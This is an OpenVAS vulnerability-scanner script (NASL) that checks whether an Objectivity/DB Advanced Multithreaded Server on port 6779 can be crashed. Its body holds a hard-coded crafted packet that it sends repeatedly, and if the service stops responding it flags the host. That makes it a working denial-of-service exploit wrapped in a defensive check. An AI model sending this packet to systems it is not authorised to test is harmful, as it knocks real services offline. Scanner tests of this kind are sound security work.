###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_objectivity_db_adv_multi_trd_srv_dos_vuln.nasl 12006 2018-10-22 07:42:16Z mmartin $
#
# Objectivity/DB Advanced Multithreaded Server Denial of Service Vulnerability
#
# Authors:
# Veerendra GG <veerendragg@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.900269");
  script_version("$Revision: 12006 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-22 09:42:16 +0200 (Mon, 22 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-02-05 04:12:38 +0100 (Sat, 05 Feb 2011)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Objectivity/DB Advanced Multithreaded Server Denial of Service Vulnerability");
  script_xref(name:"URL", value:"http://secunia.com/advisories/42901");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/45803");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/64699");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/15988/");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl");
  script_require_ports(6779);
  script_tag(name:"impact", value:"Successful exploitation may allow remote attackers to cause the
application to crash by sending specific commands.");
  script_tag(name:"affected", value:"Objectivity/DB Version R10");
  script_tag(name:"insight", value:"The flaw is due to Advanced Multithreaded Server component
allowing to perform various administrative operations without authentication.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"This host is running Objectivity/DB Advanced Multithreaded Server and is
prone to denial of service vulnerability.");
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}

ooamsPort = 6779;
if(!get_port_state(ooamsPort)){
  exit(0);
}

## Crafted packet for Advanced Multithreaded Server
ooams_kill_data = raw_string(0x0d, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02,
                             0x00, 0x00, 0x00, 0x19, 0xf0, 0x92, 0xed, 0x89,
                             0xf4, 0xe8, 0x95, 0x43, 0x03, 0x00, 0x00, 0x00,
                             0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                             0x00, 0x00, 0x00, 0x00, 0x61, 0x62, 0x63, 0x00,
                             0x31, 0x32, 0x33, 0x34, 0x00, 0x00, 0x00, 0x05,
                             0x8c, 0x00, 0x00, 0x00, 0x0d, 0x00, 0x00, 0x00,
                             0x00);

## Send Crafted packet several times
for(i=0; i < 5; i++)
{
  soc = open_sock_tcp(ooamsPort);
  if(!soc){
    exit(0);
  }

  send(socket:soc, data:ooams_kill_data);
  ## Close the scocket and wait for 5 seconds
  close(soc);
  sleep(5);

  soc = open_sock_tcp(ooamsPort);
  if(!soc)
  {
    security_message(ooamsPort);
    exit(0);
  }
  close(soc);
}
